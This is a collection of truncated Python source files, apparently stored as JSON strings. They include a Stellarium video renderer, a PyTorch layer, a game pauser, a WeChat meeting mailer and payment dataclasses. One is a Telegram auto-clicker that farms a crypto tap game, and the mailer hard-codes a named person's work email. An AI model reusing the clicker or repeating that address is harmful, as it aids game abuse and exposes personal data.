lootbox_opener.open_lootbox()\n        time.sleep(1)\n\nif __name__ == \"__main__\":\n    os.system(\"cls\")\n    main()\n",
    "import sys\nimport os\nsys.path.append(os.getcwd())\nfrom type_define.graph import Graph, Task\nfrom pipeline.task_prompt import *\nfrom pipeline.data_manager import DataManager\nfrom pipeline.retriever import Retriever\nfrom model.openai_models import OpenAILanguageModel\nfrom pipeline.utils import *\nfrom typing import Union\nimport json\nimport time\nimport logging\n\nTASK_MANAGER_WAIT_TIME = 1\nPARTIAL_GRAPH_TASK_NUM = 5\n\nclass TaskManager:\n    '''\n    Task Manager is used to manage the task list and the task graph\n    1. Init the task\n    2. Generate the subtask list\n    3. Construct the subtask graph\n    4. Feedback the subtask status\n    5. Update the task graph\n    '''\n    running = \"running\"\n    idle = \"idle\"\n\n    update_task: str = \"update\"\n    merge_task: str = \"merge\"\n\n    def __init__(self, silent:bool = False, method:str = \"update\"):\n        self.llm = None\n        self.dm:DataManager = None\n        self.graph:Graph = None\n        self.logger = init_logger(\"TaskManager\", level= logging.WARNING ,dump=True, silent=silent)\n        self.status = TaskManager.idle\n        self.agent_describe = None\n        self.retriever = Retriever()\n        self.agent_list = []\n        self.task_document = None\n        self.method = method\n        \n        self.task_description = None\n\n        self.task_trace = []\n        self.task_trace_description = []\n        self.total_trace = []\n        self.total_trace_description = []\n        self.fail_trace = []\n        self.fail_trace_description = []\n\n        self.manage_method = \"update\"\n\n\n        # delete img/*graph.png\n        for file in os.listdir(\"img\"):\n            if \"graph\" in file:\n                os.remove(\"img/\" + file)\n\n        # delete data/*graph.json\n        for file in os.listdir(\"logs\"):\n            if \"graph\" in file:\n                os.remove(\"logs/\" + file)\n                \n    def get_relevant_content_by_path(self, subtask_data: dict, query: [str]) -> list:\n        # Initialize an empty dictionary to store the extracted information\n        extracted_data = {}\n\n        # Iterate over each path in the query list\n        for path in query:\n            # Split the path by '/' to get the individual components\n            # Also, remove the initial '~' if present\n            path_components = path.lstrip('~').split('/')\n            # Remove empty strings that may result from splitting\n            path_components = [comp for comp in path_components if comp]\n\n            # Initialize a temporary variable to hold the current level of the subtask_data\n            current_level = subtask_data\n\n            # Traverse the subtask_data dictionary using the components of the path\n            for component in path_components:\n                # print(component, current_level)\n                # print(\"\")\n                # Check if the component is a key in the current level of the dictionary\n                if isinstance(current_level, dict) and component in current_level:\n                    # If it is, go one level deeper\n                    current_level = current_level[component]\n                elif isinstance(current_level, list) and component.isdigit():\n                    # If the current level is a list, and the component is a number,\n                    # try to convert the component to an integer and use it as an index\n                    index = int(component)\n                    # If the index is within the range of the list, go one level deeper\n                    if index < len(current_level):\n                        current_level = current_level[index]\n                    else:\n                        # If the index is out of range, skip this path and continue with the next one\n                        current_level = None\n                        break\n                else:\n                    # If the component is not found, try to find a close match\n                    close_match = None\n                    if isinstance(current_level, dict):\n                        for key in current_level.keys():\n                            if key.startswith(component):\n                                close_match = key\n                                break\n                    if close_match:\n                        # If a close match is found, go one level deeper using the close match\n                        current_level = current_level[close_match]\n                    else:\n                        # If no close match is found, skip this path and continue with the next one\n                        current_level = None\n                        break\n\n                # After traversing, if the current_level is not the original subtask_data,\n                # and it is not None, it means we have found relevant data,\n                # so we add it to the extracted_data dictionary\n                if current_level is not None and current_level is not subtask_data:\n                    extracted_data[path] = current_level\n\n        # Return the dictionary containing all the extracted infor",
    "from skyfield import almanac\nfrom skyfield.api import load, wgs84\nfrom typing import Tuple\n\nimport argparse\nimport isodate\nimport re\nimport os\nimport os.path\n\nfrom datetime import datetime, date, timezone\nfrom pathlib import Path\nfrom geopy.geocoders import Nominatim\n\nimport subprocess\nimport time\nimport tempfile\nimport shutil\n\nversion = \"2.0.1\"\n\n\nclass Parameters:\n    def __init__(self, args: argparse.Namespace) -> None:\n        lonlat: list = args.loc[0]\n        city: str = args.loc[1]\n        view: list[float] = args.view\n\n        self.__az: float = view[0]\n        self.__alt: float = view[1]\n        self.__fov: float = view[2]\n        self.__lon: float = lonlat[0]\n        self.__lat: float = lonlat[1]\n        self.__city: str = city\n        self.__planet: str = args.planet\n        self.__caption: str = args.caption\n        self.__outfile: str = args.outfile\n        self.__timespan: float = args.timespan\n        self.__delta_t: float = args.dt\n        self.__fps: float = args.fps\n        self.__show_video: bool = args.show_video\n        self.__template: str = args.template\n        self.__start_date: datetime = self.__determine_start_time(args.date)\n        self.__video_size = args.video_size\n\n        self.__window_size: Tuple[int, int] | None\n        if args.window_size is None:\n            self.__window_size = None\n        else:\n            if 'x' not in args.window_size:\n                raise ValueError('The window size must be of the form \"1920x1080\"')\n\n            width_str, height_str = args.window_size.split('x')\n            self.__window_size = (int(width_str), int(height_str))\n\n    def __determine_start_time(self, date: datetime) -> datetime:\n        if date.hour == 0 and date.minute == 0 and date.second == 0 and self.planet == 'Earth':\n            self.__start_at_sunset = True\n\n            latlon = wgs84.latlon(self.lat, self.lon)\n            ts = load.timescale()\n            eph = load('de421.bsp')\n            observer = eph['Earth'] + latlon\n\n            t = ts.utc(date.year, date.month, date.day)\n            t0, t1 = t, ts.utc(t.utc[0], t.utc[1], t.utc[2], 24)\n            t_set, y_set = almanac.find_settings(observer, eph['Sun'], t0, t1)\n\n            if y_set[0] == False:\n                raise ValueError(\n                    f'You must specify a specific time because the location {self.lon},{self.lat} is experiencing either polar day or polar night! The script cannot compute a sunset time for this date: {date.isoformat()}.')\n\n            return t_set[0].utc_datetime()\n        else:\n            self.__start_at_sunset = False\n            return date\n\n    @property\n    def alt(self) -> float:\n        return self.__alt\n\n    @property\n    def az(self) -> float:\n        return self.__az\n\n    @property\n    def fov(self) -> float:\n        return self.__fov\n\n    @property\n    def lon(self) -> float:\n        return self.__lon\n\n    @property\n    def lat(self) -> float:\n        return self.__lat\n\n    @property\n    def city(self) -> str:\n        return self.__city\n\n    @property\n    def planet(self) -> str:\n        return self.__planet\n\n    @property\n    def start_date(self) -> datetime:\n        return self.__start_date\n\n    @property\n    def caption(self) -> str:\n        return self.__caption\n\n    @property\n    def outfile(self) -> str:\n        return self.__outfile\n\n    @property\n    def timespan(self) -> float:\n        return self.__timespan\n\n    @property\n    def delta_t(self) -> float:\n        return self.__delta_t\n\n    @property\n    def fps(self) -> float:\n        return self.__fps\n\n    @property\n    def show_video(self) -> bool:\n        return self.__show_video\n\n    @property\n    def start_at_sunset(self) -> bool:\n        return self.__start_at_sunset\n\n    @property\n    def template(self) -> str:\n        return self.__template\n\n    @property\n    def template_file(self) -> Path:\n        tempate_folder: Path = Path(os.path.dirname(os.path.realpath(__file__)))\n        return tempate_folder / 'script' / self.__template\n\n    @property\n    def video_size(self) -> str:\n        return self.__video_size\n\n    @property\n    def window_size(self) -> Tuple[int, int] | None:\n        return self.__window_size\n\n\nclass StellariumToVideo:\n    def __init__(self, param: Parameters) -> None:\n        tempPath: Path = Path(tempfile.gettempdir()) / 'kalstar_frames'\n        self.__frame_folder = tempPath\n        self.__final_file = self.__frame_folder / 'final.png'\n        self.__first_file = self.__frame_folder / 'first.png'\n        self.__param = param\n\n        # Create frame folder if it not already exists\n        if os.path.exists(str(self.__frame_folder)):\n            shutil.rmtree(str(self.__frame_folder))\n\n        os.mkdir(str(self.__frame_folder))\n\n    def create_script(self, script_path: Path) -> None:\n        with open(self.__param.template_file, 'r') as file:\n            script = file.read()\n\n        if os.name == 'nt':\n            script = script.replace(\"$FRAME_FOLDER$\", str(self.__frame_folder).replace(\"\\\\\", ",
    "import math\n\nimport torch\nfrom torch import nn\n\nfrom .utils import unsqueeze_like\n\n\nclass MVLinear(nn.Module):\n    def __init__(\n        self,\n        algebra,\n        in_features,\n        out_features,\n        subspaces=True,\n        bias=True,\n    ):\n        super().__init__()\n\n        self.algebra = algebra\n        self.in_features = in_features\n        self.out_features = out_features\n        self.subspaces = subspaces\n\n        if subspaces:\n            self.weight = nn.Parameter(\n                torch.empty(out_features, in_features, algebra.n_subspaces)\n            )\n            self._forward = self._forward_subspaces\n        else:\n            self.weight = nn.Parameter(torch.empty(out_features, in_features))\n\n        if bias:\n            self.bias = nn.Parameter(torch.empty(1, out_features, 1))\n            self.b_dims = (0,)\n        else:\n            self.register_parameter(\"bias\", None)\n            self.b_dims = ()\n\n        self.reset_parameters()\n\n    def reset_parameters(self):\n        torch.nn.init.normal_(self.weight, std=1 / math.sqrt(self.in_features))\n\n        if self.bias is not None:\n            torch.nn.init.zeros_(self.bias)\n\n    def _forward(self, input):\n        return torch.einsum(\"bm...i, nm->bn...i\", input, self.weight)\n\n    def _forward_subspaces(self, input):\n        weight = self.weight.repeat_interleave(self.algebra.subspaces, dim=-1)\n        return torch.einsum(\"bm...i, nmi->bn...i\", input, weight)\n\n    def forward(self, input):\n        result = self._forward(input)\n\n        if self.bias is not None:\n            bias = self.algebra.embed(self.bias, self.b_dims)\n            result += unsqueeze_like(bias, result, dim=2)\n        return result\n\n\n# EPS = 1e-6\n\n# def unsqueeze_like(tensor: torch.Tensor, like: torch.Tensor, dim=0):\n#     \"\"\"\n#     Unsqueeze last dimensions of tensor to match another tensor's number of dimensions.\n\n#     Args:\n#         tensor (torch.Tensor): tensor to unsqueeze\n#         like (torch.Tensor): tensor whose dimensions to match\n#         dim: int: starting dim, default: 0.\n#     \"\"\"\n#     n_unsqueezes = like.ndim - tensor.ndim\n#     if n_unsqueezes < 0:\n#         raise ValueError(f\"tensor.ndim={tensor.ndim} > like.ndim={like.ndim}\")\n#     elif n_unsqueezes == 0:\n#         return tensor\n#     else:\n#         return tensor[dim * (slice(None),) + (None,) * n_unsqueezes]\n\n\n# def get_geometric_product_paths(algebra):\n#     gp_paths = torch.zeros(\n#         (algebra.dim + 1, algebra.dim + 1, algebra.dim + 1), dtype=bool\n#     )\n\n#     for i in range(algebra.dim + 1):\n#         for j in range(algebra.dim + 1):\n#             for k in range(algebra.dim + 1):\n#                 s_i = algebra.grade_to_slice[i]\n#                 s_j = algebra.grade_to_slice[j]\n#                 s_k = algebra.grade_to_slice[k]\n\n#                 m = algebra.cayley[s_i, s_j, s_k]\n#                 gp_paths[i, j, k] = (m != 0).any()\n\n#     return gp_paths\n\n\n# class NormalizationLayer(nn.Module):\n#     def __init__(self, algebra, features, init: float = 0):\n#         super().__init__()\n#         self.algebra = algebra\n#         self.in_features = features\n\n#         self.a = nn.Parameter(torch.zeros(self.in_features, algebra.n_subspaces) + init)\n\n#     def _norms(self, input):\n#         slice = self.algebra.grade_to_slice\n#         index = self.algebra.grade_to_index\n\n#         return [\n#             self.algebra.norm(input[..., slice[g]], blades=index[g])\n#             for g in self.algebra.grades\n#         ]\n\n#     def forward(self, input):\n#         assert input.shape[1] == self.in_features\n\n#         # norms = torch.cat(\n#         #     [\n#         #         s.norm(dim=-1, keepdim=True)\n#         #         for s in input.split(tuple(self.algebra.subspaces), dim=-1)\n#         #     ],\n#         #     dim=-1,\n#         # )\n#         # norms = self.algebra.norm(self.algebra.split_subspaces(input))[..., 0]\n#         # norms = self._norms(input)\n#         # breakpoint()\n#         norms = torch.cat(self.algebra.norms(input), dim=-1)\n#         s_a = torch.sigmoid(self.a)\n#         norms = s_a * (norms - 1) + 1  # Interpolates between 1 and the norm.\n#         norms = norms.repeat_interleave(self.algebra.subspaces, dim=-1)\n#         normalized = input / (norms + EPS)\n\n#         return normalized\n\n\n# class SteerableGeometricProductLayer(nn.Module):\n#     def __init__(\n#         self, algebra, features, include_first_order=True, normalization_init=0\n#     ):\n#         super().__init__()\n\n#         self.algebra = algebra\n#         self.features = features\n#         self.include_first_order = include_first_order\n\n#         if normalization_init is not None:\n#             self.normalization = NormalizationLayer(\n#                 algebra, features, normalization_init\n#             )\n#         else:\n#             self.normalization = nn.Identity()\n#         self.linear_right = MVLinear(algebra, features, features, bias=False)\n#         if include_first_order:\n#             self.linear_left = MVLinea",
    "import dearpygui.dearpygui as dpg\nimport subprocess\n\ndpg.create_context()\ndpg.create_viewport(title=\"pause my game\", width=440, height=480)\n\n# \u516c\u5171\u51fd\u6570\ndef runinsubprocess(thing):\n    creation_flags = subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP |subprocess.CREATE_BREAKAWAY_FROM_JOB\n    subprocess.Popen(thing, shell=True, creationflags=creation_flags,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\n# \u6309\u94ae\u51fd\u6570\ndef loadconfig():\n    with open('game_name.txt', 'r') as f:\n        game_name = f.read().splitlines()\n    dpg.configure_item('game_name_exe', items=game_name)\n    dpg.set_value('infotext' , 'Game loaded: ' + str(len(game_name)) + ' games')\n    # \u81ea\u52a8\u9009\u62e9 \u7b2c\u4e00\u4e2a\n    if len(game_name) > 0:\n        dpg.set_value('game_name_exe', game_name[0])\n\ndef editconfig():\n    runinsubprocess('notepad game_name.txt')\n\ndef pausegame():\n    dpg.configure_item('indicator', default_value='Game Paused' , color=(255,0,0))\n    game_name = dpg.get_value('game_name_exe')\n    runinsubprocess('PsSuspend ' + game_name)\n\ndef resumegame():\n    dpg.configure_item('indicator', default_value='Game Resumed' , color=(0,255,0))\n    game_name = dpg.get_value('game_name_exe')\n    runinsubprocess('PsSuspend -r ' + game_name)\n\ndef opentaskmgr():\n    runinsubprocess('taskmgr')\n\n# \u52a0\u8f7d\u5b57\u4f53\nwith dpg.font_registry():\n    with dpg.font(\"afont.ttf\", 18) as font1:  # \u589e\u52a0\u4e2d\u6587\u7f16\u7801\u8303\u56f4\uff0c\u6570\u5b57\u662f\u5b57\u53f7,\u4f1a\u6bd4\u5b98\u65b9\u5b57\u4f53\u6a21\u7cca\n        # dpg.add_font_range_hint(dpg.mvFontRangeHint_Default)\n        dpg.add_font_range_hint(dpg.mvFontRangeHint_Chinese_Simplified_Common)\n        # dpg.add_font_range_hint(dpg.mvFontRangeHint_Chinese_Full)\n    dpg.bind_font(font1)\n\n# \u7a97\u4f53\u4e3b\u51fd\u6570\nwith dpg.window(label='pauser',  width=400, height=400,pos=(10, 10)):\n    # dpg.add_input_text(default_value='PsSuspend DevilMayCry5.exe' , tag='pause_DevilMayCry5_cmd')\n    # dpg.add_input_text(default_value='PsSuspend -r DevilMayCry5.exe ' , tag='remuse_DevilMayCry5_cmd')\n\n    dpg.add_combo(default_value='' , items=['XXX.exe'], tag='game_name_exe')\n    dpg.add_text(default_value='Game Status untouched' , color=(120,120,120) ,tag='indicator')\n    dpg.add_spacing(count=3)\n\n    dpg.add_button(label='Pause', callback=pausegame);dpg.add_same_line()\n    dpg.add_button(label='Resume', callback=resumegame);dpg.add_same_line()\n    dpg.add_button(label='Taskmgr', callback=opentaskmgr)\n    dpg.add_spacing(count=3)\n    dpg.add_separator()\n    dpg.add_spacing(count=3)\n\n    dpg.add_button(label='reload config', callback=loadconfig);dpg.add_same_line()\n    dpg.add_button(label='edit config', callback=editconfig)\n    dpg.add_text(tag='infotext', default_value='Game loaded:', color=(120,120,120))\n    # dpg.show_documentation()\n# onload \u4e8b\u4ef6\nloadconfig()\n\ndpg.setup_dearpygui()\ndpg.show_viewport()\ndpg.start_dearpygui()\ndpg.destroy_context()",
    "import user_management\nimport logging\nimport os\nimport configparser\n\n\nfrom chat_analysis import analyze_chat\nfrom calendar_generator import generate_ics\nfrom email_service import send_email\n\n\ndef bind_email(wechat_id, email):\n    \"\"\"\n    \u5904\u7406\u7528\u6237\u7ed1\u5b9a\u90ae\u7bb1\u7684\u903b\u8f91\n    :param wechat_id: \u7528\u6237\u7684\u5fae\u4fe1ID\n    :param email: \u7528\u6237\u60f3\u8981\u7ed1\u5b9a\u7684\u90ae\u7bb1\u5730\u5740\n    \"\"\"\n    # \u8fd9\u91cc\u8c03\u7528user_management.py\u7684\u529f\u80fd\n    with user_management.create_connection(user_management.DATABASE) as conn:\n    # conn = user_management.create_connection(user_management.DATABASE)\n        if user_management.get_user_email(conn, wechat_id) is None:\n            user_management.add_user(conn, wechat_id, email)\n            return f\"Email {email} bound to {wechat_id} successfully.\"\n        else:\n            user_management.update_user_email(conn, wechat_id, email)\n            return f\"Email for {wechat_id} updated to {email}.\"\n    # conn.close()\n\ndef get_email(wechat_id):\n    \"\"\"\n    \u5904\u7406\u7528\u6237\u83b7\u53d6\u90ae\u7bb1\u7684\u903b\u8f91\n    :param wechat_id: \u7528\u6237\u7684\u5fae\u4fe1ID\n    \"\"\"\n    # \u8fd9\u91cc\u8c03\u7528user_management.py\u7684\u529f\u80fd\n    with user_management.create_connection(user_management.DATABASE) as conn:\n    # conn = user_management.create_connection(user_management.DATABASE)\n        email = user_management.get_user_email(conn, wechat_id)\n    # conn.close()\n    if email is None:\n        return False\n    else:\n        return email\n\n\ndef unbind_email(wechat_id):\n    \"\"\"\n    \u5904\u7406\u7528\u6237\u7ed1\u5b9a\u90ae\u7bb1\u7684\u903b\u8f91\n    :param wechat_id: \u7528\u6237\u7684\u5fae\u4fe1ID\n    :param email: \u7528\u6237\u60f3\u8981\u7ed1\u5b9a\u7684\u90ae\u7bb1\u5730\u5740\n    \"\"\"\n    # \u8fd9\u91cc\u8c03\u7528user_management.py\u7684\u529f\u80fd\n    with user_management.create_connection(user_management.DATABASE) as conn:\n    # conn = user_management.create_connection(user_management.DATABASE)\n        if user_management.get_user_email(conn, wechat_id) is None:\n            return f\"No such user: {wechat_id}\"\n        else:\n            email = user_management.get_user_email(conn, wechat_id)\n            user_management.delete_user(conn, wechat_id)\n            return f\"Unbind {email} for {wechat_id}.\"\n\ndef process_meeting_info(\n        wechat_id, \n        response, \n        openai_client, \n        config, \n        ):\n    # \u9a8c\u8bc1\u662f\u5426\u7ed1\u5b9a\u90ae\u7bb1\n    to_email = get_email(wechat_id)\n    if not to_email:\n        return \"Please bind your email address first. '@help' for help.\"\n    \n    #\u5206\u6790\u804a\u5929\u5185\u5bb9\n    meeting_info = analyze_chat(response, openai_client=openai_client, chat_model=config[\"OpenAI\"][\"chat_model\"])\n    if not meeting_info[\"is_meeting\"]:\n        return \"No meeting information found in the message.\"\n    if meeting_info[\"attendees\"]:\n        meeting_info[\"attendees\"].append(to_email)\n    else:\n        meeting_info[\"attendees\"] = [to_email]\n    logging.info(meeting_info)\n    ics_content = generate_ics(meeting_info)\n\n    # Gmail proxy settings\n    if config[\"Connection\"].get(\"socks_port\", None):\n        socks_proxy = [config[\"Connection\"][\"proxy\"], \n                    int(config[\"Connection\"][\"socks_port\"]), \n                    config[\"Connection\"].get(\"proxy_username\", None), \n                    config[\"Connection\"].get(\"proxy_password\", None)]\n        logging.info(f\"Using proxy: {socks_proxy}\")\n    else:\n        socks_proxy = None\n\n    # \u53d1\u9001\u90ae\u4ef6\n    result = send_email(config[\"Email\"][\"sender_email\"], \n                config[\"Email\"][\"sender_password\"], \n                to_email, \n                meeting_info[\"summary\"], \n                meeting_info[\"summary\"], \n                ics_content, \n                smtp_server=config[\"Email\"].get(\"smtp_server\", 'smtp.gmail.com'),\n                smtp_port=int(config[\"Email\"].get(\"smtp_port\", 587)),\n                proxy=socks_proxy)\n    # if failed, retry until two times or succeed\n    if result:\n        return f\"Meeting invitation sent successfully to {to_email}.\\n\\n{meeting_info['body']}\"\n    else:\n        return f\"Failed to send meeting invitation to {to_email}.\\n\\n{meeting_info['body']}\"\n    \n\n\n# main function\nif __name__ == \"__main__\":\n    wechat_id = \"\u674e\u6021\u5eb7 Yikang\"\n    config_file_path = os.getenv('PA_CONFIG_PATH', './config.ini')\n    config = configparser.ConfigParser()\n    logging.info(f\"Using config file: {config_file_path}\")\n    config.read(config_file_path, encoding='utf-8')\n\n    print(f\"Bind Email: {bind_email(wechat_id, 'yikang_li@idgcapital.com')}\")\n    print(f\"Get Email: {get_email(wechat_id)}\")\n    response = \"\u6211\u548c\u5ed6\u99a8\u7476\u660e\u5929\u4e0b\u53482\u70b9\u4e00\u8d77\u8ba8\u8bba\u65e5\u672c\u884c\u7a0b\u7684\u5177\u4f53\u7ec6\u8282\u3002\"\n    print(f\"Process meeting info ({response}):\\n\")\n    print(process_meeting_info(wechat_id, response, None, config))",
    "import asyncio\nfrom telethon.sync import TelegramClient\nfrom telethon.sync import functions, types, events\n\nimport json, requests, urllib, time, aiocron, random, ssl\n\n# -----------\nwith open('config.json') as f:\n    data = json.load(f)\n    api_id = data['api_id']\n    api_hash = data['api_hash']\n    admin = data['admin']\n\ndb = {\n    'click': 'on'\n}\n\nVERSION = \"1.0\"\nSTART_TIME = time.time()\n\nclient = TelegramClient('bot', api_id, api_hash, device_model=f\"TapSwap Clicker V{VERSION}\")\nclient.start()\nclient_id = client.get_me(True).user_id\n\n\nprint(\"Client is Ready ;)\")\n\n# -----------\n\nclass BypassTLSv1_3(requests.adapters.HTTPAdapter):\n    SUPPORTED_CIPHERS = [\n        \"ECDHE-ECDSA-AES128-GCM-SHA256\", \"ECDHE-RSA-AES128-GCM-SHA256\",\n        \"ECDHE-ECDSA-AES256-GCM-SHA384\", \"ECDHE-RSA-AES256-GCM-SHA384\",\n        \"ECDHE-ECDSA-CHACHA20-POLY1305\", \"ECDHE-RSA-CHACHA20-POLY1305\",\n        \"ECDHE-RSA-AES128-SHA\", \"ECDHE-RSA-AES256-SHA\",\n        \"AES128-GCM-SHA256\", \"AES256-GCM-SHA384\", \"AES128-SHA\", \"AES256-SHA\", \"DES-CBC3-SHA\",\n        \"TLS_AES_128_GCM_SHA256\", \"TLS_AES_256_GCM_SHA384\", \"TLS_CHACHA20_POLY1305_SHA256\",\n        \"TLS_AES_128_CCM_SHA256\", \"TLS_AES_256_CCM_8_SHA256\"\n    ]\n\n    def __init__(self, *args, **kwargs):\n        self.ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n        self.ssl_context.set_ciphers(':'.join(BypassTLSv1_3.SUPPORTED_CIPHERS))\n        self.ssl_context.set_ecdh_curve(\"prime256v1\")\n        self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_3\n        self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3\n        super().__init__(*args, **kwargs)\n\n    def init_poolmanager(self, *args, **kwargs):\n        kwargs[\"ssl_context\"] = self.ssl_context\n        kwargs[\"source_address\"] = None\n        return super().init_poolmanager(*args, **kwargs)\n\n    def proxy_manager_for(self, *args, **kwargs):\n        kwargs[\"ssl_context\"] = self.ssl_context\n        kwargs[\"source_address\"] = None\n        return super().proxy_manager_for(*args, **kwargs)\n\n\ndef getUrlsync():\n    return client(\n        functions.messages.RequestWebViewRequest(\n            peer='tapswap_bot',\n            bot='tapswap_bot',\n            platform='ios',\n            from_bot_menu=False,\n            url='https://app.tapswap.ai/',\n        )\n    )\n\nasync def getUrl():\n    return await client(\n        functions.messages.RequestWebViewRequest(\n            peer='tapswap_bot',\n            bot='tapswap_bot',\n            platform='ios',\n            from_bot_menu=False,\n            url='https://app.tapswap.ai/',\n        )\n    )\n\ndef authToken(url):\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-site\",\n        \"x-cv\": \"323\"\n    }\n    payload = {\n        \"init_data\": urllib.parse.unquote(url).split('tgWebAppData=')[1].split('&tgWebAppVersion')[0],\n        \"referrer\":\"\"\n    }\n    response = requests.post('https://api.tapswap.ai/api/account/login', headers=headers, data=json.dumps(payload)).json()\n\n    return response['access_token']\n\n\ndef submit_taps(taps:int, auth:str, timex=time.time()):\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-site\",\n        \"Authorization\": f\"Bearer {auth}\"\n    }\n    \n    payload = {\"taps\":taps, \"time\":timex}\n    response = session.post('https://api.tapswap.ai/api/player/submit_taps', headers=headers, json=payload).json()\n    # Energy: response['player']['energy']\n    return response\n\ndef apply_boost(auth:str, type:str=\"energy\"):\n    # Types: turbo, energy\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-site\",\n        \"Authorization\": f\"Bearer {auth}\"\n    }\n    payload = {\"type\":type}\n    response = session.post('https://api.tapswap.ai/api/player/apply_boost', headers=headers, json=payload).json()\n    return response\n\ndef upgrade(auth:str, type:str=\"charge\"):\n    # Types: energy, tap, charge\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-site\",\n        \"Authorization\": f\"Bearer {auth}\"\n    }\n    payload = {\"type\":type}\n    response = session.post('https://api.tapswap.ai/api/player/apply_boost', headers=headers, json=payload).json()\n    return response\n\ndef convert_uptime(uptime):\n    hours = int(uptime // 3600)\n    minutes = int((uptime % 3600) // 60)\n    return hours, minutes\n\n\nasync def answer(event):\n    global db\n    text = event.raw_text\n  ",
    "\"\"\"\nbase params requests.\n\"\"\"\nfrom typing import List\nfrom typing import Optional\nfrom dataclasses import dataclass\n\n\n@dataclass\nclass Hooks:\n    \"\"\"\n    the web hooks.\n    \"\"\"\n    web_hook_gateway: str\n    error_redirect_gateway: str\n    success_redirect_gateway: str\n\n    def to_dict(self):\n        \"\"\"\n        dict representation.\n        \"\"\"\n        return {\n            \"webhookGateway\": self.web_hook_gateway,\n            \"successRedirectGateway\": self.success_redirect_gateway,\n            \"errorRedirectGateway\": self.error_redirect_gateway\n        }\n\n\n@dataclass\nclass ShippingAddress:\n    \"\"\"\n    Shipping address\n    \"\"\"\n    city: Optional[str] = None\n    line1: Optional[str] = None\n    line2: Optional[str] = None\n    state: Optional[str] = None\n    country: Optional[str] = None\n    last_name: Optional[str] = None\n    first_name: Optional[str] = None\n    postal_code: Optional[str] = None\n    phone_number: Optional[str] = None\n\n    def to_dict(self):\n        \"\"\"\n        Dictionary representation.\n        \"\"\"\n        return {\n            \"City\": self.city,\n            \"Line1\": self.line1,\n            \"Line2\": self.line2,\n            \"State\": self.state,\n            \"Country\": self.country,\n            \"LastName\": self.last_name,\n            \"FirstName\": self.first_name,\n            \"PostalCode\": self.postal_code,\n            \"PhoneNumber\": self.phone_number\n        }\n\n\n@dataclass\nclass BillingAddress:\n    \"\"\"\n    billing adddress\n    \"\"\"\n    city: Optional[str] = None\n    line1: Optional[str] = None\n    line2: Optional[str] = None\n    state: Optional[str] = None\n    country: Optional[str] = None\n    last_name: Optional[str] = None\n    first_name: Optional[str] = None\n    postal_code: Optional[str] = None\n    phone_number: Optional[str] = None\n\n    def to_dict(self):\n        \"\"\"\n        dict representation.\n        \"\"\"\n        return {\n            \"City\": self.city,\n            \"Line1\": self.line1,\n            \"Line2\": self.line2,\n            \"State\": self.state,\n            \"Country\": self.country,\n            \"LastName\": self.last_name,\n            \"FirstName\": self.first_name,\n            \"PostalCode\": self.postal_code,\n            \"PhoneNumber\": self.phone_number\n        }\n\n\n@dataclass\nclass UzRegulatoryOrderDetails:\n    \"\"\"\n    Regulatory order details\n    \"\"\"\n    taxi_tin: Optional[str] = None\n    latitude: Optional[str] = None\n    longitude: Optional[str] = None\n    taxi_pinfl: Optional[str] = None\n    taxi_vehicle_number: Optional[str] = None\n\n    def to_dict(self):\n        \"\"\"\n        Dictionary representation.\n        \"\"\"\n        return {\n            \"TaxiTin\": self.taxi_tin,\n            \"Latitude\": self.latitude,\n            \"Longitude\": self.longitude,\n            \"TaxiPinfl\": self.taxi_pinfl,\n            \"TaxiVehicleNumber\": self.taxi_vehicle_number\n        }\n\n\n@dataclass\nclass Order:\n    \"\"\"\n    Order details\n    \"\"\"\n    order_id: Optional[str] = None\n    order_items: Optional[str] = None\n    billing_address: BillingAddress = None\n    shipping_address: ShippingAddress = None\n    uz_regulatory_order_details: UzRegulatoryOrderDetails = None\n\n    def to_dict(self):\n        \"\"\"\n        Dictionary representation.\n        \"\"\"\n        if self.billing_address:\n            self.billing_address = self.billing_address.to_dict()\n\n        if self.shipping_address:\n            self.shipping_address = self.shipping_address.to_dict()\n\n        if self.shipping_address:\n            self.shipping_address = self.shipping_address.to_dict()\n\n        return {\n            \"OrderId\": str(self.order_id),\n            \"OrderItems\": self.order_items,\n            \"BillingAddress\": self.billing_address,\n            \"ShippingAddress\": self.shipping_address,\n            \"UzRegulatoryOrderDetails\": self.uz_regulatory_order_details\n        }\n\n\n@dataclass\nclass ExtraAttributes:\n    \"\"\"\n    Extra attributes\n    \"\"\"\n    key: str\n    value: str\n    description: Optional[str] = None\n\n    def to_dict(self):\n        \"\"\"\n        Dictionary representation.\n        \"\"\"\n        return {\n            \"Key\": self.key,\n            \"Value\": self.value,\n            \"Description\": self.description\n        }\n\n\n@dataclass\nclass Metadata:\n    \"\"\"\n    Metadata details\n    \"\"\"\n    order: Order\n    channel: Optional[str] = None\n    extra_attributes: List[ExtraAttributes] = None\n\n    def to_dict(self):\n        \"\"\"\n        Dictionary representation.\n        \"\"\"\n        extra_attributes = []\n\n        if self.order:\n            self.order = self.order.to_dict()\n\n        if self.extra_attributes:\n            for item in self.extra_attributes:\n                for key, value in item.items():\n                    extra_attributes.append(\n                        ExtraAttributes(\n                            key=str(key),\n                            value=str(value)\n                        ).to_dict()\n                    )\n\n        return {\n            \"Order\": self.order,\n            \"Channel\": self.channel,\n            \"ExtraAttributes\": extra_attributes\n      ",
